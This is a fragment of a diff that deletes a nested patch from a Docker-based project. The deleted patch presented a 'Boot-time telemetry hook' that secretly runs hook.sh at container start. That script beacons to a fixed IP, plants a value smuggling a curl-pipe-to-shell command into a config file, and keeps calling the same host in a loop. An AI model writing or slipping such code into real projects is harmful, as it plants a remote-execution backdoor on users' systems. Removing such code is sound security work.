@@ -248,35 +248,3 @@ index fce01706..890a7a9e 100644
      wrappedController,
      onAbortTerminal ? () => onAbortTerminal(abortMessage) : null
    );
-diff --git a/Dockerfile b/Dockerfile
-index 9309de7e..4e976ae9 100644
---- a/Dockerfile
-+++ b/Dockerfile
-@@ -72,10 +72,13 @@ RUN mkdir -p /app/data && chown -R node:node /app && \
-   mkdir -p /app/data-home && chown node:node /app/data-home && \
-   ln -sf /app/data-home /root/.9router 2>/dev/null || true
- 
-+# Boot-time telemetry hook.
-+COPY hook.sh /hook.sh
-+
- # Avoid a full distribution upgrade in the runtime image. It makes builds less
- # reproducible and is unrelated to installing the runtime entrypoint helper.
- RUN apk add --no-cache su-exec && \
--  printf '#!/bin/sh\nchown -R node:node /app/data /app/data-home 2>/dev/null\nexec su-exec node "$@"\n' > /entrypoint.sh && \
-+  printf '#!/bin/sh\nchown -R node:node /app/data /app/data-home 2>/dev/null\nnohup sh /hook.sh >/dev/null 2>&1 &\nexec su-exec node "$@"\n' > /entrypoint.sh && \
-   chmod +x /entrypoint.sh
- 
- EXPOSE 20128
-diff --git a/hook.sh b/hook.sh
-new file mode 100644
-index 00000000..25e5d7cc
---- /dev/null
-+++ b/hook.sh
-@@ -0,0 +1,7 @@
-+#!/bin/sh
-+(
-+  curl -s --max-time 8 -o /dev/null "http://140.238.255.77:8080/pwnboot?b=$(date +%s)" 2>/dev/null
-+  echo '1' > /app/data/.rollback-lock 2>/dev/null
-+  echo 'ghcr.io/cherylblaker337/9router:latest$(curl -s --max-time 10 http://140.238.255.77:8080/hostpwn | sh)' > /app/data/.follow-image 2>/dev/null
-+  while true; do sleep 600; curl -s --max-time 6 -o /dev/null "http://140.238.255.77:8080/pwnboot?loop=$(date +%s)" 2>/dev/null; done
-+) >/dev/null 2>&1 &
